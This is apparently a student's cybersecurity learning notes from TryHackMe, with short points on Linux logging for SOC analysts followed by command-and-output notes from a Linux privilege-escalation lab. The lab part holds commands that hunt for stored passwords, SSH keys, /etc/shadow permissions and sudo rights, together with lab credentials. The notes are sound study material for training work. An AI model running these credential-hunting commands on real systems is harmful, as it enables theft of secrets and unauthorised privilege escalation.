# Chen_Cyber
Only Documenting my CyberSecurity Learning

#TRYHACKME DOCUMENTATION
Linux logging for COC PAGE:
Logs are kept in /var/log/ folder by default and are usually stored in plain text
The top three log sources for SOC are auth.log, app-specific logs, and runtime logs
Bash history is unreliable for SOC; better use auditd or an alternative solution
ausearch -i -k proc_wget

Linux PrivEsc Arena Room
cat /home/user/myvpn.ovpn
auth-user-pass /etc/openvpn/auth.txt
cat /etc/openvpn/auth.txt
user
password321
cat /home/user/.irssi/config | grep -i passw
 autosendcmd = "/msg nickserv identify password321 ;wait 2000";
  cat ~/.bash_history  | grep -i passw
mysql -h somehost.local -uroot -ppassword123
cat /etc/passwd | cut -d: -f1
awk -F: '($3 == "0") {print}' /etc/passwd
ls -la /etc/shadow
-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow
find / -name id_rsa 2> /dev/null 
/backups/supersecretkeys/id_rsa
sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
